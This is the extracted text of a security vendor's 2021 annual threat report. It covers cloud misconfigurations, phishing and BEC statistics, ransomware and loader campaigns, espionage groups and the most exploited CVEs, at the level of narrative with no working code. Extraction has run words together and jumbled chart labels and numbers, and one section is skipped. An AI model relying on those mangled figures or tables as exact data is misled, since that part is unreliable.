discoveryNetscanShareFinderKerberoastingNet-GPPPasswordKerberoastingAnyDeskProcDumpProcDumpProcDumpPSExecFigure 5. Conti\u2019s infection chainImpactContiLateral movement anddefense evasionCreate scheduledtask on remote systemsCobeacon, KillAV, ContiKillAVEx\ufb01ltrationRclone8 | Navigating New Frontiers: Trend Micro 2021 Annual Cybersecurity ReportCloud Adopters and Remote Workers Contend With Rising Threats to Cloud EnvironmentsThreats to cloud security were among the most pressing IT infrastructure risks for organizations in 2021,according to the Cyber Risk Index for the first half of 2021.32 Protecting their cloud architecture is a challengefor companies because many of the technologies that compose this architecture are regularly updatedwith new features.33 On top of these complexities, defenders must keep up with the tools malicious actorsuse to target the cloud, which are also constantly changing. For instance, in 2019, steganography, or thepractice of hiding code within an image, was a trend in cloud attacks.34 The following year, maliciousactors used valid and clean images that downloaded malware onto affected systems after deployment.And as detailed in our midyear cybersecurity report, in 2021 attackers reverted to using images withmalicious content.35Malicious Actors Continue to Take Advantage of Cloud MisconfigurationsThe cloud has helped many organizations accelerate their digital transformations and embrace remote workduring the Covid-19 pandemic. Spending on cloud infrastructure, including cloud computing and storagesolutions, saw a 6.6% year-on-year increase in the third quarter of 2021, which amounted to US$18.6billion, and 2021 saw an overall growth in cloud-related expenditure, according to the International DataCorporation.36However, malicious actors were quick to capitalize on this push toward digitization, as securing the cloudcomes with its share of complexities. Cloud environments continued to be at risk of compromise at thehands of cybercriminals who were out to abuse any misconfigurations, which proved to be major weakspots of cloud security even though CSPs had endeavored to make cloud services safer by recommendingthat all customers follow the shared responsibility model.37Fortifying the security postures of cloud environments that use services like those of Amazon Web Services(AWS), Microsoft Azure, and Google Cloud Platform (GCP) \u2014 the three biggest CSPs in the world38 \u2014should be a top priority for cloud adopters, for whom misconfigurations might not only lead to costly databreaches but also run up expenses from idle instances and unused storage.39 According to 2021 data9 | Navigating New Frontiers: Trend Micro 2021 Annual Cybersecurity Reportfrom Trend Micro Cloud One\u2122 \u2013 Conformity, Amazon Elastic Block Store, a block storage service, hadthe highest number of configuration failures among AWS services, with a misconfiguration rate of 29%.Virtual Machines had the most misconfigurations among Azure services, with a 65% misconfigurationrate, while Identity and Access Management (IAM) pulled in the most misconfigurations among GCPservices, with a 98% misconfiguration rate.30,920,763 rate2,671,588 rate2,569,233 rate5,819,174 rule checks7,531,008 rule checks104,822,208rule checksAmazon Elastic Block Store(Amazon EBS)Amazon Simple Storage Service(Amazon S3)AWS CloudFormationFigure 6. The misconfiguration rates for the top three AWS services in terms of rule checks in 2021Source: Trend Micro Cloud One\u2122 \u2013 Conformity2,244,741 rule checks640,196 rule checks3,448,582rule checksVirtual MachinesStorage accountsApp ServiceFigure 7. The misconfiguration rates for the top three Microsoft Azure services in terms of rule checksin 2021Source: Trend Micro Cloud One \u2013 Conformity64,655 rule checksVPC(Virtual Private Cloud)66,273 rule checksCloud IAM1,106 rule checksCloud SQLFigure 8. The misconfiguration rates for the top three GCP services in terms of rule checks in 2021Source: Trend Micro Cloud One \u2013 Conformity10 | Navigating New Frontiers: Trend Micro 2021 Annual Cybersecurity ReportOne misconfiguration that was frequently abused by malicious actors in 2021 was found in the RESTAPIs of Docker, a software platform used to build, test, and deploy software applications. Incorrectlyconfigured servers with exposed Docker REST APIs became a prime target for the cybercriminal groupTeamTNT, which abused the Docker REST APIs by using compromised Docker Hub accounts to deploymalware like cryptocurrency miners.40The growing adoption of cloud-based software and services has put the cloud in the crosshairs of maliciousactor groups like TeamTNT, which was among the first groups to target CSPs in their campaigns, primarilyto steal CSPs\u2019 environmental metadata. Upon analyzing their recent campaigns, we found that the grouphad augmented its repertoire of tools, which enabled it to launch more modular attacks on specificvictims. 41ScannerList of targets(e.g., IP addresses)Scan resultsExploitable securityPayload deliveryweaknessExploitablesecurity weaknessVictimFigure 9. TeamTNT\u2019s attack chainThis group was also the perpetrator behind a cryptocurrency-mining and credential theft campaignthat targeted Kubernetes, a widely used container management platform, from March to May 2021.By exploiting a role-based access control misconfiguration as an entry point for its attacks, TeamTNTwas able to take over multiple Kubernetes clusters. This resulted in the compromise of nearly 50,000 IPaddresses, most of which were in China and the US.42Email Threats Climb as More Organizations Adopt Remote WorkSince the onset of the pandemic, internet and email usage had been even more instrumental for businesscontinuity and remote work. As email became an even more useful tool for people around the world whowere working from home, malicious actors seized the opportunity to take advantage of remote workers\u2019increased dependence on online communication. In 2021, Trend Micro Cloud App Security, an API-basedsolution that protects both users and organizations from threats to their cloud-based apps and services,detected and blocked more than 25.7 million email threats, a marked increase from the over 16.7 millionthreats that the solution detected and blocked the previous year.11 | Navigating New Frontiers: Trend Micro 2021 Annual Cybersecurity ReportEmail remained an oft-used avenue for cybercriminals to stage their attacks. In fact, 92% of malwarewas delivered through email in 2021.43 Phishing emails in particular were responsible for 90% of 2021\u2019sdata breaches.44 Phishing campaigns persisted as an effective means to spread malware, especiallyransomware, in 2021, as proved by the enduring success of Emotet, the notorious botnet-malware-turned-RaaS. Authorities took down Emotet in November 2021, but its absence was short-lived, as itresurfaced toward the end of the year.45 Its yearslong use by ransomware groups like Ryuk and trojans likeTrickbot showed how much the underground economy had grown and continued to evolve, to the pointthat it eventually developed its own supply chain.46Phishing attempts that were detected and blocked by Trend Micro Cloud App Security in 2021 nearlydoubled from those in 2020. Of these, 62% were from spam emails, which increased nearly sevenfoldfrom the previous year. The remaining 38% were credential-phishing attempts, which grew by 14% from2020. (Credential phishing involves cybercriminals\u2019 use of fake login pages to gull potential victims intohanding over their account credentials, whereas phishing by spam email is a broader category that aimsto get user information.) The finance industry experienced the most phishing attempts, followed closelyby the healthcare and education industries.Spam phishingCredential phishing1,458,35510,118,433 5,465,9696,225,719 2M0202020214M6M8M10M12MFigure 10. A comparison of the detections of spam phishing and credential-phishing attemptsin 2020 and 2021Source: Trend Micro Cloud App Security12 | Navigating New Frontiers: Trend Micro 2021 Annual Cybersecurity ReportFinanceHealthcareEducationAcademic researchRetailManufacturingHospitalityTransportationOthers3,448,9903,427,4513,205,4622,306,0791,349,6331,277,8241,268,634987,0312,406,736Figure 11. The industries with the highest detections of spam phishing and credential-phishing attempts0500K1M1.5M2M2.5M3M3.5Min 2021Source: Trend Micro Cloud App SecurityDespite a slight increase during the first half of the year, possibly as a result of more attacks on businessesand supply chains related to vaccine production,47 detections of attempts at business email compromise(BEC) totaled 282,775 in 2021, dropping 11% from the previous year\u2019s BEC detections.Malicious actors turned to increasingly sophisticated BEC attempts, focusing on improving the qualityof their email content rather than on churning out a high volume of attack attempts. Though there werefewer BEC attempt detections in 2021, Trend Micro Cloud App Security found and blocked 133,541 BECemails using authorship analysis, while the remaining 149,234 were detected using behavior and intentionanalysis. The former, which could be detected only by comparing the spoofing email with the writingstyle of the supposed sender, made up 47% of all BEC attempts in 2021, whereas the 73,210 that weredetected in 2020 composed only 23% of all BEC attempts found that year.13 | Navigating New Frontiers: Trend Micro 2021 Annual Cybersecurity Report73,210244,364133,541149,23420202021Authorship analysis Behavior and intention analysis050K150K250K350KFigure 12. A comparison of the proportions of BEC attempts blocked based on authorship analysisand BEC attempts blocked based on behavior and intention analysis in 2020 and 2021Source: Trend Micro Cloud App SecurityThe greatest numbers of BEC attempts were aimed at the retail and consulting industries. The retailindustry remained an appealing target for financially motivated cybercriminals, especially phishingfraudsters, owing to the wealth of customer payment data, credentials, and other personal informationthat retailers held.4834,536RetailConsultingEducationShippingManufacturingTransportationHealthcareGovernmentOthers27,77016,51416,08813,27411,44711,3479,04223,75705K10K15K20K25K30K35KFigure 13. The industries with the highest detections of BEC attempts in 2021Source: Trend Micro Cloud App Security14 | Navigating New Frontiers: Trend Micro 2021 Annual Cybersecurity ReportIn 2021, the information and communication industry was the most common target of malware-ladenemails. While many businesses struggled during the pandemic, this industry continued to grow and isexpected to be valued at over US$11.9 trillion by 2025, which might explain why it had been in thecrosshairs of attackers.49 Retail companies were also on the receiving end of many emails with malware.Retailers drew the attention of more attackers after the industry experienced rapid growth when onlinesales surged as a result of the pandemic.50 Malicious email attachments were also a common means forcybercriminals to carry out attacks on construction firms, which were appealing targets because of theirvaluable intellectual properties, such as blueprints, that could be used to bypass buildings\u2019 security.51Information and communicationRetailConstructionFinanceManufacturingHealthcareTechnologyTransportationOthers561,753397,072356,952198,408188,373150,002148,090143,625146,4990100K200K300K400K500K600KFigure 14. The industries with the highest detections of malware files in emails in 2021Source: Trend Micro Cloud App Security15 | Navigating New Frontiers: Trend Micro 2021 Annual Cybersecurity ReportTargeted Attacks Take Aim at Bigger Game With Upgraded ArsenalWith more malicious actors moving past the indiscriminate distribution of their malware, 2021 saw certainindustries fall prey to targeted attacks. An enduring threat that has plagued organizations as far back as2012,52 targeted attacks require a high level of technical expertise and a plethora of resources on the partof threat actors, because the tools and techniques involved need to be tailored to the intended victims\u2019systems.53During the first half of 2021, we observed a shift to more targeted modern ransomware that veeredaway from quantity-based attacks and toward more profitable prey,54 as more cybercriminals resorted toincreasingly advanced tools and techniques that pointed to a targeted approach. Not only can this kindof attack have a direct impact on the targeted organization, but its effects can also be felt by the victim\u2019scustomers because of any resulting business disruption or customer information leakage.55 The threatactors behind a targeted attack may be financially motivated, but its main goal is data theft.56Void Balaur Stages Attacks on Government Entities and Other TargetsAlso known as Rockethack, Void Balaur is a cybermercenary group that deals largely in data theft andcyberespionage, advertising its services in the Russian-speaking cybercriminal underground throughforums and websites like Darkmoney and Probiv. In past years, we observed this group launch attacks onthe telecommunications, retail, financial, medical, and biotechnology industries. They continued pursuingtelecommunications organizations in 2021, when we discovered that Void Balaur had been targetingengineers and management officers of various Russian and UK telecommunications outfits.5716 | Navigating New Frontiers: Trend Micro 2021 Annual Cybersecurity ReportAlthough the hackers-for-hire behind the group are driven by monetary gain, they have also frequentlytargeted journalists, human rights activists, and government officials. For instance, in September 2021,we found Void Balaur targeting a former head of an intelligence agency, two members of the nationalparliament, and five active government ministers of an Eastern European country. This suggests thattheir activities might play into a larger campaign on multiple fronts to cause widespread disruption. Manyof their targets are based in Russia and its neighboring countries, although Void Balaur activity has alsobeen spotted in other European countries, the US, Japan, and Israel.Among Void Balaur\u2019s main services is hacking into email and social media accounts. For a higher fee, thegroup can also supply the complete copies of stolen email inboxes without the users\u2019 knowledge. In 2019,it began selling the confidential information of Russian individuals, such as their criminal records, credithistories, bank statements, text messages, and passport and flight data. Void Balaur uses specializedmalware like Z*Stealer and DroidWatcher, capable of remote tracking, accessing location information,and stealing user credentials for different apps and digital currency wallets.58Tropic Trooper Returns to Attack the Transportation and Government IndustriesThe cyberespionage group Tropic Trooper, which now goes by Earth Centaur, has been active since2011 but it resurfaced in July 2020 with new tools, including modified remote access trojans (RATs).Toward the end of 2020 and continuing in 2021, we observed it using these tools to target transportationbusinesses and transport-related government organizations.59 Its attacks commonly involve informationtheft \u2014 including that of financial documents, search histories, and flight schedules \u2014 from compromisedsystems. Based on our analysis, we predict that Tropic Trooper will continue gathering confidential datawhile waiting for the opportune time to capitalize on it.Tropic Trooper usually breaches its victims\u2019 systems by exploiting vulnerabilities in their Microsoft InternetInformation Services and Exchange servers, and then installing web shells that execute backdoorssuch as ChiserClient and SmileSvr. The group uses a customized variant of Gh0st RAT to discover andcollect information from active sessions on an infected host, which it then exfiltrates using the victim\u2019scompromised intranet.The threat actors behind Tropic Trooper have proved themselves talented at red teamwork. By usingopen-source frameworks, they have developed various backdoors with different protocols, which theyhave used to bypass their victims\u2019 security settings. They also employ reverse proxies to avoid detectionby network security systems.17 | Navigating New Frontiers: Trend Micro 2021 Annual Cybersecurity ReportMore Malicious Actors Use BazarLoader as an Arrival MechanismDuring the third quarter of 2021, we observed an uptick in the use of BazarLoader, an information stealerand loader that we detected as TrojanSpy.Win64.BAZARLOADER and Backdoor.Win64.BAZARLOADER.The highest detections of BazarLoader took place in the Americas region.60Since it was first observed in 2020,61 BazarLoader has been used by cybercriminals to gain initial accessfor data theft or to deploy second-stage malware like ransomware. Between January and October 2021,BazarLoader campaigns that used malicious spam emails as an arrival mechanism primarily targeted theUS, followed by select European and Asian countries. Most of these emails took the form of fraudulentorder invoices and notices of service plan termination. On the other hand, campaigns that used JavaScriptdroppers to deliver BazarLoader over the same period focused on targets in the US and Australia.Notably, malicious actors use different arrival mechanisms to deliver BazarLoader as part of their attacks.In one method, BazarLoader is bundled with a legitimate program and deployed using a software installer,such as that for VLC and TeamViewer. Its delivery mechanism possibly involves social engineering asa means of tricking victims into downloading the compromised installer. A BazarLoader executable isthen dropped while the installer is loading. The installer creates a process that runs the BazarLoaderexecutable and then establishes a connection with a command-and-control (C&C) server using MicrosoftEdge.Other malicious actors favor a method that involves delivery by way of an ISO file that contains a WindowsLNK (link) file. The LNK file is disguised as a folder icon to trick a victim into clicking it, which runs itsBazarLoader dynamic-link library (DLL) payload.Qakbot Reemerges With an Improved VariantDiscovered in 2007,62 the information stealer Qakbot, which is detected by Trend Micro asTrojanSpy.Win32.QAKBOT, has become popular among ransomware operators as a piece of malware-installation-as-a-service botnet malware for their campaigns. In 2019, Qakbot infections were used in thedeployment of manually operated ransomware families like MegaCortex, PwndLocker, Egregor, ProLock,and, most recently, REvil/Sodinokibi.63Following a three-month hiatus, Qakbot operators resumed their email spam run in September 2021.Their campaign returned with a new version of Qakbot that uses Visual Basic for Applications (VBA)macros as well as Excel 4.0 macros. Over the past years, we observed that spam campaigns linked toQakbot operators mainly targeted the telecommunications, technology, and education industries. Amongthe top countries affected by these campaigns were the US, Japan, and Germany.18 | Navigating New Frontiers: Trend Micro 2021 Annual Cybersecurity ReportBuer Loader Becomes Better at Evading DetectionBuer Loader\u2019s competitive pricing made it the malware loader of choice for many threat actors when itwas introduced in the underground market in 2019. It remains active to this day and has been used bythreat actors to deploy well-known malware such as Ryuk, Wizard Spider, and the Cobalt Strike beaconas part of targeted ransomware attacks.64 We found that Buer Loader was most active in India, followedby Israel, and that detections of the loader were highest among organizations in the healthcare, banking,and telecommunications industries.In 2021, a new variant of Buer Loader, written in Rust, was used in spam runs that involved emailswith malicious attachments containing the loader. One campaign used emails that masqueraded as DHLshipping notices, while succeeding campaigns mentioned Covid-19 in their emails as a lure or referencedboth DHL and Covid-19. The Buer Loader variant used in these emails retains most of the same code asin previous variants, but it was likely rewritten in a new programming language to avoid detection. Thisupdated variant also uses signed XLL (Excel add-in) files as another way to stay under the radar of theirvictims\u2019 IT teams.Water Basilisk Uses New Crypter Tool to Flood Systems With RATsAugust 2021 saw the height of activity for a fileless attack campaign called Water Basilisk, which bombardsits victims\u2019 systems with RATs \u2014 including BitRat, NjRat, LimeRat, Warzone, QuasarRat, and NanocoreRAT \u2014 through a new HCrypt variant.65 The operators behind Water Basilisk use this crypter-as-a-serviceto make obfuscated VBScript and PowerShell scripts that deploy their malicious payloads. We haveobserved Water Basilisk incidents that involve PowerShell scripts containing as many as seven RATs.66Water Basilisk actors have been hosting their malware and phishing kits on publicly accessible file-hostingservices and compromised WordPress websites. They use these WordPress websites or phishing emailsto disseminate a malicious ISO image. This image has an obfuscated VBScript stager that downloads andexecutes next-stage VBScript content into an infected system. Finally, PowerShell scripts deobfuscateand deploy their payload RATs in a given process.The HCrypt version that Water Basilisk uses to propagate its malware is sold in underground markets forUS$199. Our analysis suggests that more variants of this crypter tool, which continues to be updatedby its developers, will be introduced in the future, and these can contain even more RATs and have anupdated obfuscation algorithm to evade detection more effectively.19 | Navigating New Frontiers: Trend Micro 2021 Annual Cybersecurity ReportRising Vulnerabilities Leave Unpatched Systems Exposed to More RisksThe intricacies of modern IT infrastructures make patch management essential for business operations torun smoothly, but this is easier said than done: On average, it takes 200 days to fix a vulnerability, and 256days if the flaw is rated severe.67 In an ideal world, organizations routinely update the software they rely onand their own security policies. But this is a tall order for IT teams that are already spread thin, especiallybecause tracking updates is but one of their many everyday tasks.68Older Flaws Stay Relevant as Malicious Actors Bank on Unprotected IT EnvironmentsIn 2021, Trend Micro\u2122 Zero Day Initiative\u2122 (ZDI), a part of Trend Micro Research, released advisorieson 1,604 vulnerabilities, which was 10% higher than the corresponding number from the previous year.Among these, 54 were rated with critical severity, a significant decrease from the 173 critical vulnerabilitiesof 2020. However, 2021 did see an increase in those rated with high severity, rising to 1,138 from theprevious year\u2019s 983.20 | Navigating New Frontiers: Trend Micro 2021 Annual Cybersecurity Report1,200983187 LowFigure 15. A comparison of the proportions of Common Vulnerability Scoring System (CVSS) ratingsamong vulnerabilities disclosed by Trend Micro\u2019s ZDI program in 2020 and 2021Source: Trend Micro\u2122 Zero Day Initiative\u2122Many legacy vulnerabilities have stayed in use, as there remains a demand for them in the undergroundexploit market. In fact, our 2021 study found that 22% of the exploits sold in the underground were overthree years old.69 Such exploits have been a reliable source of income for malicious actors, who can sellthem in underground forums, with prices starting at US$1,000.70Data from Trend Micro\u2122 TippingPoint\u00ae Threat Protection System, a network security platform deployedat some of the largest organizations in the world, shows that malicious actors also exploited relativelynew vulnerabilities alongside older ones, with some dating as far back as 2005, despite the availabilityof patches for these flaws. There are familiar names in the list of vulnerabilities with the highest exploitcounts in 2021; seven of these have been extensively abused by cybercriminals and have ranked amongthe most exploited flaws since 2017.Far and away the highest number of exploit detections in 2021 was of CVE-2019-1225, which amountedto over 75 million found by Trend Micro. CVE-2019-1225 is a memory disclosure flaw in Microsoft\u2019sRemote Desktop Services that was disclosed in August 2019.71 Successful exploits of this vulnerabilityallow attackers to gather information that they can use to further compromise victims\u2019 systems. Comingin second was the critical vulnerability CVE-2017-14100. Found in Asterisk, a software implementationof a private branch exchange from Digium, this flaw accounted for more than 20 million detections in2021. Exploits of this flaw, which was disclosed in September 2017, allow unauthorized users to remotelyperform arbitrary shell command injections.7221 | Navigating New Frontiers: Trend Micro 2021 Annual Cybersecurity ReportCVE ID numberAffected productRule IDHitsCVE-2019-1225Windows RDP serverDV-3604275,267,406CVE-2017-14100Asterisk 11DV-2973920,846,194CVE-2011-1264Microsoft Windows ServerCVE-2010-0817Microsoft SharePoint serverDV-38864,831,951CVE-2014-6271CVE-2014-6277GNU BashDV-167981,860,228CVE-2014-6278CVE-2014-3567OpenSSLDV-170561,622,083CVE-2005-1380BEA Admin ConsoleCVE-2010-3936Microsoft Forefront Unified Access GatewayCVE-2010-0817Microsoft SharePoint serverCVE-2017-0068Microsoft EdgeCVE-2003-1138ApacheCVE-2017-5638Apache StrutsCVE-2018-13379Fortinet FortiOSCVE-2018-10562Dasan GPON home routerDV-20231,054,890DV-11984DV-27410DV-36087DV-319361,032,998784,031631,799588,763Table 1. The top vulnerabilities in terms of exploit detections in 2021Source: Trend Micro\u2122 TippingPoint\u00ae Threat Protection SystemLog4j Flaw Log4Shell Leads to Exploit Outbreak2021 was peppered with noteworthy incidents that resulted from unpatched security gaps, such as thehigh-severity vulnerability CVE-2021-44228. First reported privately to Apache in November 202173 anddubbed Log4Shell, this flaw affects Apache Log4j, a Java-based logging tool.74 Although the open-source Apache community had released a patch for it in December, the vulnerability still led to a slewof exploits that malicious actors developed for a variety of illicit activities, including data theft, malwaredeployment, and unauthorized cryptocurrency mining or cryptojacking. Notably, the operators of theKhonsari ransomware began using Log4Shell in their attacks in December 2021.75Log4j is a widely used utility in both in-house and third-party applications for enterprises. Log4j\u2019sdependence on Java makes it difficult to detect when the tool is running across an enterprise\u2019senvironments. This explains why Log4Shell is not easily addressed, despite the availability of a patch.Log4Shell could allow attackers to send crafted log messages that execute arbitrary code, effectivelyweaponizing compromised machines to launch different kinds of attacks.22 | Navigating New Frontiers: Trend Micro 2021 Annual Cybersecurity ReportAs of December 2021, Log4Shell affected only 7% of Trend Micro customers, scattered across theAmericas, the AMEA (Asia, Middle East, and Africa) region, Europe, and Japan, with the US havingexperienced the highest number of incidents.76 Among our customers, the organizations most affected bythis vulnerability belonged to the government, retail, and manufacturing industries.Attackers Exploit ProxyLogon and ProxyShell FlawsOther prominent flaws that made waves in 2021 included the ProxyLogon and ProxyShell vulnerabilities inMicrosoft Exchange Server, which were disclosed in late 2020. Microsoft released patches for ProxyLogon(CVE-2021-26855) in March 2021 and for the ProxyShell vulnerabilities (CVE-2021-34473 and CVE-2021-34523) in May and July 2021.77 Despite the availability of patches, however, our telemetry showed thatProxyLogon had been part of many 2021 attacks by different malware families, such as the LemonDuckcryptocurrency miner, the BlackKingdom ransomware, and the Prometei botnet malware.78In September 2021, researchers reported on spam campaigns employing a new loader calledSquirrelwaffle.79 We found that these campaigns also used ProxyLogon and ProxyShell exploits in theirspam campaigns, and in doing so, they were able to send malicious emails posing as replies in existingemail threads to trick potential victims.80 In November 2021, our investigation into Squirrelwaffle intrusionsin the Middle East showed that publicly available ProxyLogon exploits were used to gain access to, searchthrough, and even download a victim\u2019s email messages. The ProxyShell vulnerabilities were also abusedby Squirrelwaffle\u2019s operators to impersonate a local administrator, enabling them to perform PowerShellcommands and deliver email replies containing a malicious Excel file.81Email withmalicious linkDownload \ufb01le with malicious macroExecute malicious script and download DLL loaderCobal Strike orQbot C&CConnect toSquirrelwa\ufb04e C&CFigure 16. The infection chain of the malicious Excel file in a Squirrelwaffle spam email23 | Navigating New Frontiers: Trend Micro 2021 Annual Cybersecurity ReportUnpatched VPN Vulnerabilities Threaten Promotion Agency, and the Japan Computer Emergency Response Team Coordination Center25 | Navigating New Frontiers: Trend Micro 2021 Annual Cybersecurity ReportPandemic-Related Threats Evolve and Continue to Plague Remote WorkersThe Covid-19 pandemic has driven organizations to rethink their own operations. In the midst of it, manyhave adopted a hybrid work model that is dependent on remote connection and cloud computing toadapt to and stay afloat through the seismic changes it has precipitated.88 However, research showed thatin 2021, 72% of organizations in the US still struggled to defend themselves against attacks that aimed toinfiltrate their corporate networks through their employees\u2019 work-from-home setups.89Home offices had expanded the attack surfaces of enterprises, as demonstrated at Pwn2Own Austin2021, a hacking competition organized by Trend Micro\u2019s ZDI program.90 The event highlighted how theremote-working staples that many teleworkers relied on could be subjected to attacks. The participatingsecurity researchers carried out collision hacks on devices like printers, routers, and network-attachedstorage (NAS) devices by using previously disclosed vulnerabilities or discovering new ones. Collectively,the participants at Pwn2Own Austin disclosed 61 new bugs.91Malicious actors have typically used the latest events and news stories in phishing attacks, but theseemails could be used only in the short term. The pandemic, though, has provided them with an abundanceof information around which they could theme their phishing emails. Daily Covid-19 news coverage andupdates have given them a steady supply of guises that have helped them better tailor their techniquesto potential victims.92Throughout 2021, we observed various scams and malware attacks that used social engineering tacticsto entice potential victims into providing personal information. One trend was the increasing phishingattacks on the vaccine cold chain, likely because employees involved in any link of the chain had access tovaluable sensitive data. Another was the proliferation of fake mobile apps and websites that impersonatedgovernment entities, nongovernmental organizations, and companies involved in vaccine distribution,which malicious actors used to target people seeking aid, work opportunities, or more information onhow to acquire vaccines.93We detected more than 8 million threats related to Covid-19 in 2021, about half as many as those inthe previous year. As in 2020, most of these threats were from the US and Germany, which were likelytargeted because of the important part they played in the cold chain as the base countries of majorvaccine researchers and manufacturers.26 | Navigating New Frontiers: Trend Micro 2021 Annual Cybersecurity Report3,065,294US1,932,437463,221310,512222,634213,182209,595204,648197,661170,400GermanyColombiaUKItalyJapanMoroccoNetherlandsFranceBrazil0500K1.0M1.5M2.0M2.5M3.0M3.5MFigure 17. The top 10 countries in terms of detections of Covid-19-related threats in 2021Source: Trend Micro Smart Protection NetworkThreats that revolved around Covid-19 largely consisted of emails, which accounted for 94% of all ourCovid-19-related threat detections in 2021; these saw a 45% year-on-year decrease over 2020. Therewas also a drop, of 82%, in detected malicious URLs from 2020 to 2021. On the other hand, maliciousfiles more than quadrupled from 2020 to 2021; most of these were detected in Indonesia and Brazil.EmailsURLsFiles14,503,9557,922,623 1,852,042325,27337,567156,2472020202103M6M9M12M15MFigure 18. A comparison of the detections of Covid-19-related threats,consisting of malicious emails, URLs, and files in 2020 and 2021Source: Trend Micro Smart Protection Network27 | Navigating New Frontiers: Trend Micro 2021 Annual Cybersecurity ReportPandemic-related threats in 2021 peaked in May, which was an eventful period for cybercrimes againstthe healthcare industry. In that month, Ireland\u2019s public healthcare system, the Health Service Executive,fell victim to a debilitating Conti attack, resulting in the largest ever known cyberattack on a health servicecomputer system.94 Additionally, a 2021 report showed that there were two or more data breaches in thehealthcare industry per day for five consecutive months, from March to July, which might account in partfor the substantial surge in Covid-19-related threats in May.95639,724447,705557,399660,4951,337,725766,344717,083799,419714,015673,906474,588615,740JANFEBMARAPRMAYJUNJULAUGSEPOCTNOVDEC0300K600K900K1.2M1.5MFigure 19. A monthly comparison of the detections of Covid-19-related threats in 2021Source: Trend Micro Smart Protection Network28 | Navigating New Frontiers: Trend Micro 2021 Annual Cybersecurity ReportIn 2021, there was a 49% year-on-year decline in Covid-19-related threats, which could be explainedby different factors. Malicious actors might have been lying in wait for new pandemic-related trends andnews that they could abuse. However, these threats were concentrated in two countries, so cybercriminalinterest in Covid-19-themed lures could have been waning elsewhere. While media consumption wasstrong in certain countries, especially in Western Europe, the same could not be said of countries whosemedia agencies were not as preoccupied with the Covid-19 crisis.96 Additionally, the working hours lostbecause of widespread lockdowns were equivalent to 255 million full-time jobs in 2020,97 but that numberreceded to 125 million jobs the following year, as more people returned to work after mass vaccinationrollouts and declines in Covid-19 cases.98 As the world gradually adjusted to this new normal and the labormarket made return-to-office plans, Covid-19-themed threats began to lose their efficiency. Heightenedawareness of these threats might have also pushed more enterprises and individual users to employsoftware solutions that improved their security postures.Still, constant vigilance of scams surrounding the pandemic is necessary for all organizations if theyare to steer clear of costly losses. The World Economic Forum reports that since the pandemic began,cybercrime has evolved in step with the global digital economy: Organizations have had to fend off anaverage of 270 attacks each in 2021, and a single successful attack attempt can run up as much asUS$3.6 million in losses.9929 | Navigating New Frontiers: Trend Micro 2021 Annual Cybersecurity ReportIncreasingly Sophisticated Threats Call for Robust and Multilayered Defense2021 was marked by attacks that grew in number and complexity, and whose repertoire of advancedtools and techniques underscored the necessity of a more strategic, risk-focused approach to security.Sudden shifts in business operations, like the mass migration to remote work and a growing dependenceon online environments, brought about a shift in the attack surface and a multitude of security gaps thatmalicious actors were only too eager to exploit. Companies had grown more reliant on technologies likethe internet of things (IoT) and added more connected devices to their corporate network, which in turnwidened their attack surfaces.100The changing face of cybercrime means that conventional defense practices are no longer as effective asthey once were. An organization needs to focus on managing risk throughout the life cycle of its attacksurface, with a focus on discovering an ever-changing attack surface, assessing risk, and then mitigatingthat risk. This enables the organization to ensure a secure working environment for its physical offices andbe on the lookout for threats that can undermine its virtual workspaces as well. Modern-day distributedworkforces do not access company resources the way they did on-premises, and the security needs ofenterprises across the board have outgrown the password-based authentication processes that werebuilt on binary login scenarios.101New security paradigms like zero trust, which assumes that attackers exist both within and outside asystem, are more suited to managing transformed attack surfaces. This is not achieved by any oneproduct; zero-trust environments are governed by a philosophy of constant validation and monitoring, sothe trustworthiness of every device and user is properly assessed before any device or user is grantedpermissions to any company resource. By practicing stringent access management policies that aregrounded in zero trust, organizations can be better equipped to protect themselves against attackersattempting credential dumping to access their systems or steal their sensitive data.102Investments in advanced security technologies should not be the sole focus of an organization\u2019s defensestrategy. These also need to be paired with policies that can stand up to increasingly elaborate scams andlures that elevate overall risk. The social engineering tactics and human errors that have allowed attacksto make inroads year after year stress the crucial role that individual users play in a company\u2019s securityprofile. A workforce that has access to the resources it needs to stay alert and well-informed of potentialthreats can help cut off potential entry points for attackers.30 | Navigating New Frontiers: Trend Micro 2021 Annual Cybersecurity ReportSince the pandemic started, the need to secure at-home work setups has also put additional strain oncybersecurity teams, 61% of which are already understaffed,103 as the shift to hybrid work arrangementshas added to the complexity of enterprise networks and left security personnel scrambling to assistremote employees. Until this talent gap can be addressed, organizations should work alongside securityvendors to automate processes and provide advanced analytics to lessen the load on their overworkedcybersecurity workforce.104Companies need security solutions that can assist in the discovery, assessment, and mitigation ofpersistent and emerging risks across the enterprise. It is important for enterprises to understand theirgrowing attack surfaces to determine the security risks of their digital assets if they are to stay agileand adapt quickly to a changing threat landscape. Discovering the ways in which their attack surfacesare continuously changing and expanding will help enterprises gain the insights they need to accuratelyassess and apply the right security solutions to thwart threats.However, this is beyond the capability of siloed tools or any single layer of protection. To manage the riskof evolving threats, decision-makers need to derive insights from high-quality data. As more organizationsundergo digital transformations, they come up against the daunting task of breaking down data silos,which are usually borne of business units that are accustomed to collecting information separately and ofsiloed technology and legacy systems built over time as companies grow.105Data gathered in silos from different products makes it a challenge for organizations to act on securityincidents swiftly. Without a means to correlate all this information, security leaders are left to piece togetherdifferent perspectives of an attack, often with varying levels of detail, from different technologies.106 Havingsolutions in place that can assess, cross-check, and consolidate output from systems helps centralizedata and results in a more detailed picture of an organization\u2019s risk posture.On top of the complex threats bearing down on organizations, they also must keep pace with the risingnumber of data privacy and security compliance rules. However, only 4% of a compliance officer\u2019s timegoes toward actually updating policies or implementing new measures to stay abreast of regulatorydevelopments, whereas 26% of their time on the job is spent liaising with different teams within theirorganization.107 A compliance team should be able to access accurate reporting of its company\u2019sIT infrastructure if it is to be more agile and productive, instead of having to interface with differentdepartments to manually collect the information it needs.Organizations can put themselves in a better position to map out their expanding attack surfaces byemploying a unified cybersecurity platform that can monitor and address the different needs of theirendpoint, email, network, and cloud environments simultaneously. In doing so, they can achievetransparency over the goings-on in their entire digital ecosystems, anticipate new threats, and plancountermeasures accordingly.31 | Navigating New Frontiers: Trend Micro 2021 Annual Cybersecurity ReportThe Threat Landscape in BriefIn 2021, Trend Micro Smart Protection Network, including Mobile App Reputation Service, IoT ReputationService, and Smart Home Network, protected Trend Micro customers from more than 94 billion threats.Our year-on-year data shows an increase in blocked threats and reputation queries across most metricscompared to 2020, most notable of which is the substantial 382% spike in blocked malicious files.94,289,585,240Overall blocked threats in 202157,262,610,93069,869,979,425Blocked email threats202020211,676,675,1943,468,559,504Blocked malicious URLs3,698,445,87117,834,808,438Blocked malicious \ufb01les020B40B60B80B0500M 